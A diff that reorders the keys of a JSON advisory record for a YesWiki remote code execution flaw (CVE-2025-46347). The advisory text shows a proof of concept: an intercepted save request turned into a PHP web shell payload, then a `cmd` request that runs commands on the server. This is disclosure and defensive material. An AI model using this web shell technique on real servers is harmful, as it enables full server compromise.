@@ -1,52 +1,17 @@
 {
-  "id": "GHSA-88xg-v53p-fpvf",
-  "summary": "YesWiki Remote Code Execution via Arbitrary PHP File Write and Execution",
-  "details": "### Summary\nAn arbitrary file write can be used to write a file with a PHP extension, which then can be browsed to in order to execute arbitrary code on the server. \n\nAll testing was performed on a local docker setup running the latest version of the application.\n\n### PoC\nProof of Concept\n\nNavigate to `http://localhost:8085/?LookWiki` which allows you to click `Create a new Graphical configuration` where you specify some parameters and then click `Save`. \n\n![LookWiki](https://github.com/user-attachments/assets/11c638ec-b700-483a-91fb-2d83107c2c69)\n\n\nAfter clicking save, this request is made (most headers removed for clarity): \n\n```\nPOST /?api/templates/custom-presets/test.css HTTP/1.1\nHost: localhost:8085\n\nprimary-color=%230c5d6a&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\n```\n\nThis request writes the file `test.css` to disk with the contents (abbreviated)\n```\n:root {\n  --primary-color: #0c5d6a;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nTo exploit this, utilize a proxy tool to intercept the the first request and change the filename extension to `.php` and add arbitrary PHP code in for one of the request body parameters. \n\ne.g. `primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E`\n\nNow the file `pizzapower.php` is written to `/var/www/html/custom/css-presets/pizzapower.php` and it starts with this, where the PHP code is present. \n\n\n```\n:root {\n  --primary-color: <?php system($_GET['cmd']); ?>;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nThen, simply visit the file with a `cmd` parameter included. \n\n```\nhttp://localhost:8085/custom/css-presets/pizzapower.php?cmd=id\n```\n\nAnd the HTTP response will contain the output of our command. Notably this request can be performed unauthenticated (the creation of the file requires auth, though). \n\n```\n:root {\n  --primary-color: uid=501(yeswiki) gid=501 groups=501\n;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n![injection](https://github.com/user-attachments/assets/6567d500-23b9-4587-a166-3b49878446e7)\n\n### Impact\n\nFull compromise of the server. Can potentially be performed unwittingly by a user subjected to the previously reported (or future) XSS vulnerabilities. \n\n## Fixes\n\nAmongst others: \n\nRestrict file extensions: Only allow a safelist of extensions (e.g., .css) when saving files via this feature.\nHarden server config: Disable PHP execution in user-writable directories",
-  "aliases": [
-    "CVE-2025-46347"
-  ],
-  "modified": "2025-04-29T20:57:25.553898Z",
-  "published": "2025-04-29T14:45:42Z",
-  "related": [
-    "CVE-2025-46347"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2025-04-29T18:15:44Z",
-    "cwe_ids": [
-      "CWE-116"
-    ],
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "github_reviewed_at": "2025-04-29T14:45:42Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46347"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/YesWiki/yeswiki"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "last_known_affected_version_range": "<= 4.5.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-88xg-v53p-fpvf/GHSA-88xg-v53p-fpvf.json"
+      },
       "package": {
-        "name": "yeswiki/yeswiki",
         "ecosystem": "Packagist",
+        "name": "yeswiki/yeswiki",
         "purl": "pkg:composer/yeswiki/yeswiki"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -54,7 +19,8 @@
             {
               "fixed": "4.5.4"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -81,18 +47,52 @@
         "v4.5.1",
         "v4.5.2",
         "v4.5.3"
-      ],
-      "database_specific": {
-        "last_known_affected_version_range": "<= 4.5.3",
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-88xg-v53p-fpvf/GHSA-88xg-v53p-fpvf.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "CVE-2025-46347"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-116"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-04-29T14:45:42Z",
+    "nvd_published_at": "2025-04-29T18:15:44Z",
+    "severity": "HIGH"
+  },
+  "details": "### Summary\nAn arbitrary file write can be used to write a file with a PHP extension, which then can be browsed to in order to execute arbitrary code on the server. \n\nAll testing was performed on a local docker setup running the latest version of the application.\n\n### PoC\nProof of Concept\n\nNavigate to `http://localhost:8085/?LookWiki` which allows you to click `Create a new Graphical configuration` where you specify some parameters and then click `Save`. \n\n![LookWiki](https://github.com/user-attachments/assets/11c638ec-b700-483a-91fb-2d83107c2c69)\n\n\nAfter clicking save, this request is made (most headers removed for clarity): \n\n```\nPOST /?api/templates/custom-presets/test.css HTTP/1.1\nHost: localhost:8085\n\nprimary-color=%230c5d6a&secondary-color-1=%23d8604c&secondary-color-2=%23d78958&neutral-color=%234e5056&neutral-soft-color=%2357575c&neutral-light-color=%23f2f2f2&main-text-fontsize=17px&main-text-fontfamily=%22Nunito%22%2C+sans-serif&main-title-fontfamily='Nunito'%2C+sans-serif\n```\n\nThis request writes the file `test.css` to disk with the contents (abbreviated)\n```\n:root {\n  --primary-color: #0c5d6a;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nTo exploit this, utilize a proxy tool to intercept the the first request and change the filename extension to `.php` and add arbitrary PHP code in for one of the request body parameters. \n\ne.g. `primary-color=%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E`\n\nNow the file `pizzapower.php` is written to `/var/www/html/custom/css-presets/pizzapower.php` and it starts with this, where the PHP code is present. \n\n\n```\n:root {\n  --primary-color: <?php system($_GET['cmd']); ?>;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n\nThen, simply visit the file with a `cmd` parameter included. \n\n```\nhttp://localhost:8085/custom/css-presets/pizzapower.php?cmd=id\n```\n\nAnd the HTTP response will contain the output of our command. Notably this request can be performed unauthenticated (the creation of the file requires auth, though). \n\n```\n:root {\n  --primary-color: uid=501(yeswiki) gid=501 groups=501\n;\n  --secondary-color-1: #d8604c;\n  --secondary-color-2: #d78958;\n  --neutral-color: #4e5056;\n  --neutral-soft-color: #57575c;\n  --neutral-light-color: #f2f2f2;\n  --main-text-fontsize: 17px;\n  --main-text-fontfamily: \"Nunito\", sans-serif;\n  --main-title-fontfamily: 'Nunito', sans-serif;\n}\n```\n![injection](https://github.com/user-attachments/assets/6567d500-23b9-4587-a166-3b49878446e7)\n\n### Impact\n\nFull compromise of the server. Can potentially be performed unwittingly by a user subjected to the previously reported (or future) XSS vulnerabilities. \n\n## Fixes\n\nAmongst others: \n\nRestrict file extensions: Only allow a safelist of extensions (e.g., .css) when saving files via this feature.\nHarden server config: Disable PHP execution in user-writable directories",
+  "id": "GHSA-88xg-v53p-fpvf",
+  "modified": "2025-04-29T20:57:25.553898Z",
+  "published": "2025-04-29T14:45:42Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/YesWiki/yeswiki/security/advisories/GHSA-88xg-v53p-fpvf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46347"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/YesWiki/yeswiki/commit/8fe5275a78dc7e0f9c242baa3cbac6b5ac1cc066"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/YesWiki/yeswiki"
+    }
+  ],
+  "related": [
+    "CVE-2025-46347"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "YesWiki Remote Code Execution via Arbitrary PHP File Write and Execution"
 }
